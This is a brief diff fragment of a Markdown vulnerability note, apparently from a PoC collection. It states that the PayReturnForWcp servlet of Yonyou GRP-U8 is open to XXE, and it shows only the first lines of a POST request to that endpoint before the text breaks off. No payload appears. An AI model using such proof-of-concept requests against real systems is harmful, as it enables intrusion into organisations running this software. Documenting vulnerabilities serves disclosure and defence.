@@ -1,6 +1,6 @@
 ## 用友GRP-U8-PayReturnForWcp接口存在XXE漏洞
 
-## poc
+## POC
 ```
 POST /servlet/PayReturnForWcp HTTP/1.1
 Host: 172.16.135.132:8009
